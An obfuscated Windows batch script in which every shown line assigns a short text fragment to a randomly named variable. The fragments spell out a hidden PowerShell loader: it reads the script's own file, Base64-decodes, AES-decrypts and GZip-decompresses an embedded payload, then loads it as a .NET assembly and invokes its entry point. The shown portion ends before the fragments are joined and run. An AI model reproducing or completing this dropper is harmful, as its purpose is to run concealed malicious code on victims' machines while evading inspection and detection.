@echo off
set "wXRabuwjsT=ll"
set "sXGRnpZqAX=32"
set "bKqALKNfjr=xe"
set "hwXJFJZsST=:\"
set "mDvBTXQkOt=he"
set "rEsdiehTlq=ll"
set "niGdooPyVz=we"
set "PjaHvlHajB=ow"
set "ZcXsdGEDIy=em"
set "RAkKhxVCsE=Sy"
set "LxrOsHcgTw=Wi"
set "MhJZdXkNsa=we"
set "KHZbuZuBPN=\v"
set "cfhWGVKzxx=rs"
set "IFJOlrMXRx=py"
set "TEShIpPJRo=rS"
set "bLDSZxnhQC=co"
set "mCrNdBwJtg=st"
set "CfjwRUvsco=ws"
set "DmIxdtRYIy=Po"
set "DhhtfBsqcv=1."
set "bJBuqbxwbe=nd"
set "pfHEpPdrUk=\W"
set "goWFlNzuqI=.e"
set "tkPsXHKwQS=he"
set "nOWAEWMRfn=0\"
set "ORohqYHQqg=y "
set "sueXMRIzPj=s\"
set "TsUTloVzzN=do"
set "vZgIjODSGA=in"
set "oaohRUHdgi= C"
set "TGrXELkNYY=po"
set "xEKBixNdOC= /"
set "KqChccUutQ= %~dp0"
set "nFZRRZlUEd=cd"
set "VXHFROFCnd=('%*'"
set "nhuWMlQwkC=rtS4"
set "hCRnxQzKkG=ing("
set "XbNvQFIUnK=ionM"
set "mElHUafLNQ=e = "
set "VEfNbRkmiO=Rq);"
set "YZyqhSxKAj=s75K"
set "yYbnuxqLrW=onve"
set "jzygGADzKq=he.I"
set "LUXrxoUPTX=.Dis"
set "FXbgnclRLP=N.En"
set "wpNiFhtyso=iEhe"
set "FXBPWZKtuu=hx ="
set "GNNmHFSWmG=sSF."
set "zlbzzlttDY=1..-"
set "OQFXnbMUxN=embl"
set "ytmfbnVRTq=).Sp"
set "bXjkXfeedP=File"
set "zoKliWkTBY=G.Su"
set "JwBSdWwxOr=k; }"
set "VzEFXuLupT=;$NO"
set "jEpOSZrODe=bjec"
set "qAGSvFnKCB=.Dis"
set "IqEdgAOVUs=XwG."
set "hYPHXRuWHg=tem."
set "wcrYBZJDsO=join"
set "kKEbijYKJZ=7;$T"
set "ducmvkTHzb=am;$"
set "wMRLtOowbD=d;$T"
set "iteuNsNDnS=Invo"
set "oYKBynBxAz=Rq.T"
set "QhASfklwSv=vert"
set "mNIlZviJBs=PKCS"
set "VNthayvLOW=oH, "
set "hoCuaLoNWE=iEhe"
set "EMHmODlzku=iEhe"
set "uDVfCvmzIQ=wcNp"
set "kcUTBLsmqI=raph"
set "GCqSOMGLVz=();$"
set "dJnHgQCFku=UXOh"
set "OwivcaNiKP=ptog"
set "pcyyQaroab=();$"
set "TokfRcENyf=ispo"
set "EggmZarYyh=morF"
set "AYByIisWWw=y]::"
set "wDPLGkDzMD=m.IO"
set "WqQpqjPDNN=O.Me"
set "rAEcfhknlE=le  "
set "vcgceLXqZE=rt]:"
set "gqCHRjwCQY=[Env"
set "scEazDbWRi=)))"
set "cXwgSudIom=XOhx"
set "GCfGNKDmkr=hy.A"
set "FzffAdzxgH= '')"
set "IDelUWZZmk=wvXw"
set "mdqmyPuzGV=-joi"
set "SvYSJJJZkA=106u"
set "fplTUATNuH=[Sys"
set "wVLqHMWsDz=;$GC"
set "QOyWcFFmbe=();$"
set "grRqBCOdVm=($wv"
set "wyChWpjerh=ress"
set "rOsMWBqsLu=] -j"
set "izWtTYqPMx='[-1"
set "TFEkaXfFkY=gnir"
set "ZNbbwBHrHk=ress"
set "dXewQNWTqn=UX.T"
set "UJrHtCQDHo== $T"
set "WNIKAWHhQQ=pose"
set "mPoCzCDrwr=form"
set "hdyMcLZpIr=ect "
set "xFDwYZbzaH=V = "
set "PaGTYMsMKr=n ''"
set "VErUIDSHJn=$ZEi"
set "NwgtElatzD= [Sy"
set "tQaZWOpFqB= = N"
set "cBUuTVEyNa=th('"
set "GhrjkRqpkQ=;$GC"
set "rysnNBsqLH=::De"
set "JWqjfWSBwm=ew-O"
set "shZUoPrjuW= '')"
set "JpcYQOtrqc=oL'["
set "rtcPoiYSEB=ypto"
set "WOeGpPHDEx=pose"
set "MhFRxAADSx=.IO."
set "uvWGWgeQDB=tem."
set "EDcrSOkjax=l5E7"
set "liCTBcrqVh= if "
set "YyFoLvVOaK=wcNp"
set "noqrFOKhJj=WF ="
set "zhNmyeblUE=m.IO"
set "zGWlMIXMsF=TllA"
set "EMyxZWuTpz= = ["
set "GKAAXiWFxS=yTo("
set "tjRdsTnLWZ=g = "
set "yScZxSkSAY=RmAx"
set "dqONipAuRY=F'[-"
set "mopQzoUPRg= New"
set "fimPkNpLaw=6esa"
set "iHAaHKLihL=m.Re"
set "LLWOEHmvdt=raph"
set "AgCkiGbXiG=Comp"
set "kdXpdlVDIU=-joi"
set "ybXryKpJdZ=-1.."
set "DlkfZljuDI=($wv"
set "AUEOoOCGGF=-Obj"
set "ahiiRnICWo=ck($"
set "PZhRLHUjeP=iEhe"
set "HQfdqirCFV=::('"
set "JKyxCbfvMQ=mMVe"
set "pvDUrLFdNH=ode]"
set "FZoDdkWveY=tion"
set "OqeibeRIXi=('da"
set "tgdomSITyp=ddin"
set "XHruybZaxh=Secu"
set "yjinLYwUfE=ZEiq"
set "JxudUIJNOO=$NOP"
set "zBuwXuayYc=rofi"
set "YtBrFsxZbD=nage"
set "PBkPiRdgqB=esaB"
set "aNIVIIjfAM=ecry"
set "wUrDkpIlcF=]::("
set "GSdomftijS=.GZi"
set "RUMILVzSnJ=);$T"
set "XlDCqUGiDn===')"
set "jFIcwxzWDH=1] -"
set "ByQlZibYYX=.Mem"
set "goBmYsacul=Disp"
set "AtkIRNwZQj=gMod"
set "OIumoAlEbl='[-1"
set "CxNYMVbOxA=dj0C"
set "lRePaSuZJY=e.Pa"
set "BKXPloNWaZ=Syst"
set "XppCBRxrUc=Obje"
set "JslJCKYCmf=ct S"
set "oazIIvFmFZ=eam("
set "gpVofbUIQl=ress"
set "fZLEvcyZQM=GsSF"
set "QbktmmMoCc=[Sys"
set "GZUyJFdGIw=e]::"
set "fsxwqKtRgf=  $Z"
set "xzLtDEuYIR=rity"
set "QuUloAqbOC=16] "
set "BUlxhlmgDK=rans"
set "OQVymMeTuF=and "
set "xBbmZXmfSf=urit"
set "TzqdLtNnyf=ment"
set "hrJQvHoqTc=XwG "
set "PfoVAJZqUk=ss -"
set "IMIHEHNSmR=m(, "
set "bTTpRREzbE= = $"
set "TaUpbyTmPK=comm"
set "VZufjYrzbF=flec"
set "zIGPyeSpMc=grap"
set "AMlYmoOEJc=.Cry"
set "tutuofrCrC=saBm"
set "UwOdGEaWfX=sion"
set "GOZXSpmuwS=ay()"
set "NAwHqaAasO=Secu"
set "RFjhhJwDyH=)($Z"
set "vjeKbfHpHi=fore"
set "BXPrSTQTuh=ke($"
set "TYoItLbsBb=6] -"
set "KHJeeGVppV='0Pg"
set "OMbjkIMlbC=);$O"
set "PqTrUYmkgm=.Cry"
set "dwadpJBPQr=pStr"
set "hPIMhjsPRe=ct S"
set "FgWpKgkHzq=stem"
set "IiUtTbhjmx=Obje"
set "YJwIWaKlkR=se()"
set "ZRVxfOQxtF=Mode"
set "JgrKQzIzHo=);$Z"
set "dlfNIFtvFQ=[IO."
set "MWxhFeymXR=esMa"
set "TasUWlLceK=.Cre"
set "jSWeBbDeiM=.Cop"
set "QmFPhCRUXv=('%~f0'"
set "JsfapxMwVj=-4] "
set "DcMAoyrlRW=$vCk"
set "HsXJlyEssj=Syst"
set "PPTlsiAHHp=ddin"
set "CEbvlDYSlO=, (,"
set "FUBMaSIXLO=stem"
set "cfKBMqyXPn=null"
set "GxiESQqaqA=CkRq"
set "xAJVCBBUmS=; };"
set "uAzJYKhCyG=lBlo"
set "DjtBMGOZzz=y.Pa"
set "FDWonQtMSD=('Tg"
set "NufXjNwgHH=PxEW"
set "FViyeUnElg=ert]"
set "FFsVembNau=.Mod"
set "vbSPrJyvrW=, $U"
set "dmkxTuBnct=oint"
set "bGFGbEJNqG=Stre"
set "vYjnuPcBnd=XOhx"
set "yEfUXWDQaT= = $"
set "fATKxiLdJN=qa.D"
set "qozioJXwtO= [st"
set "apoaQcgwVP=tem."
set "laSwEefHtb=oryS"
set "jxzZYuIzDt=zuZI"
set "NNsDdAmCyt=bstr"
set "molaaYcIfR=Star"
set "kdScaOIALx=PTtG"
set "zbmhKUCTeu=New-"
set "GsQwHxoQhC=$UXO"
set "KgFYpLqFEP=x, 0"
set "EsZGRmoLTd=$GCi"
set "OZCeDcICHx=ring"
set "VnMZaRFQGC=F) {"
set "QMQtikYMgY=Bmor"
set "kFxYwUqcnd=UXOh"
set "IfDiQkcsag=[Sys"
set "onpnrnBNhI=comp"
set "BLKkqaUNMW=t Sy"
set "BMbaUoVCad=pres"
set "wmmxrkTULb=3); "
set "rnuBkyWwUx=Rq ="
set "poiXoOkjZu=Comp"
set "WdhqphQFnR=]::N"
set "AfYeuanauB=)) {"
set "btBqFjVoab=]::C"
set "RHCIKthnav=orF'"
set "rUhUtTrxKi=ptor"
set "qjxFZRgbMp=);$v"
set "OAUUjReRCm=in $"
set "mifPtGBPKR=TiEh"
set "iOGWpZUUTa=iron"
set "IwTJcDbGGy=L4Yi"
set "HuIMjZkPJO= [Sy"
